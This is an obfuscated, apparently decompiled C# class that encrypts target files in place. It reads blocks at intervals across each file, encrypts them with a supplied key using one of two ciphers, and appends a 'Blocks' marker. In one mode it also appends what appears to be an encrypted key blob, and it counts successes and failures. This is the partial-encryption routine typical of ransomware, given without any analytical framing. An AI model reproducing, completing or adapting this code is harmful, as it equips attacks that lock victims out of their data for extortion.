using System;
using System.IO;
using System.Text;
using kAAphfzOgRuTne;

namespace OeQGwjtftIBDg;

internal sealed class aPmKQJajtniGBkiL
{
	public static int vnkgSqPhiyR(long long_0)
	{
		return (int)long_0;
	}

	public static bool giukCbhWyeyjClL(string XjTUiAtzbZTbJ, string OVnSOpMrAPmOcUI, string jZtQdEKlfle, byte[] rqsXXtFEAiZKU = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(XjTUiAtzbZTbJ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = vnkgSqPhiyR(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(OVnSOpMrAPmOcUI) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(OVnSOpMrAPmOcUI) * 1000 * 1000;
				}
				int gbfoxWsBqFMa = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = mAoVaFeDCjRz(XjTUiAtzbZTbJ, fileStream, gbfoxWsBqFMa, num * i);
					array = (jSdbwwLMlbK.GtQHtyUYTAIYOR ? KBdxgLGHgkeiH.XWZoHXBxnyxpF(byte_, Encoding.ASCII.GetBytes(jZtQdEKlfle), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : IuIIhDBsGDXt.hzCfVwhNVmpN(byte_, Encoding.ASCII.GetBytes(jZtQdEKlfle), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					zVyzwgjPWdifm(XjTUiAtzbZTbJ, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (jSdbwwLMlbK.cqwcNhPdCH ? Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj("QmxvY2tz") + jSdbwwLMlbK.aOUUGKAtMbj("Kw==") + Convert.ToString(OVnSOpMrAPmOcUI) + jSdbwwLMlbK.aOUUGKAtMbj("Kw==")) : Encoding.ASCII.GetBytes(jSdbwwLMlbK.aOUUGKAtMbj("QmxvY2tz") + jSdbwwLMlbK.aOUUGKAtMbj("LQ==") + Convert.ToString(OVnSOpMrAPmOcUI) + jSdbwwLMlbK.aOUUGKAtMbj("LQ==")));
			if (!jSdbwwLMlbK.cqwcNhPdCH)
			{
				using FileStream fileStream2 = new FileStream(XjTUiAtzbZTbJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(XjTUiAtzbZTbJ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(rqsXXtFEAiZKU, 0, rqsXXtFEAiZKU.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (jSdbwwLMlbK.NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(jSdbwwLMlbK.agUGmZJGeSw, "File: " + XjTUiAtzbZTbJ + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			jSdbwwLMlbK.kAIRALERmvGYRk++;
			return false;
		}
		jSdbwwLMlbK.RGcMmldgjxiBCQ++;
		return true;
	}

	public static byte[] mAoVaFeDCjRz(string ZBOcBuTbrzpvBr, FileStream eeXDTIYseeQVLq, int GbfoxWsBqFMa, int ziUgYxqpWIiqgX = 0)
	{
		byte[] array = new byte[GbfoxWsBqFMa];
		eeXDTIYseeQVLq.Position = ziUgYxqpWIiqgX;
		eeXDTIYseeQVLq.Read(array, 0, GbfoxWsBqFMa);
		return array;
	}

	public static void zVyzwgjPWdifm(string EGWgVDbeXgOvLPVxw, FileStream ZNsxttFVpfseL, byte[] grZMgUGTBZX, int aFYaXFvNuCcoil = 0)
	{
		ZNsxttFVpfseL.Position = aFYaXFvNuCcoil;
		ZNsxttFVpfseL.Write(grZMgUGTBZX, 0, grZMgUGTBZX.Length);
	}
}
